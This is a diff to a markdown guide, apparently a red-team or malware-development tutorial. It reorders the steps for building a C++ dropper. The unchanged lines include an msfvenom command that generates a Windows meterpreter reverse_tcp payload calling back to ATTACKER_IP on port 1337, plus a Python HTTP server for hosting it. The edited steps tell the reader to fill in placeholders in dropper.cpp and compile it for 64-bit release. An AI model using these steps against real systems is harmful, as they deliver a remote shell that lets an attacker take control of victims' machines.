@@ -96,9 +96,7 @@ $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -
 $ python3 -m http.server 8080
 ```
 
-3. Download the `dropper.cpp`, and open it. There are several placeholder values on lines 16, 22, 24, 27, and 33 that 
-must be altered to make the code function properly. Once you have entered the values, compile the code for a 64-bit 
-release.
+3. Download the `dropper.cpp`, and [open it in Visual Studio Code or Codium](https://code.visualstudio.com/docs/languages/cpp).
 
 ```text
 #include <iostream>
@@ -153,6 +151,9 @@ int main() {
     return 0;
 }
 ```
+
+4. There are several placeholder values on lines 16, 22, 24, 27, and 33 that must be altered to make the code function 
+properly. Once you have entered the values, compile the code for a 64-bit release.
 
 ## Resources
 
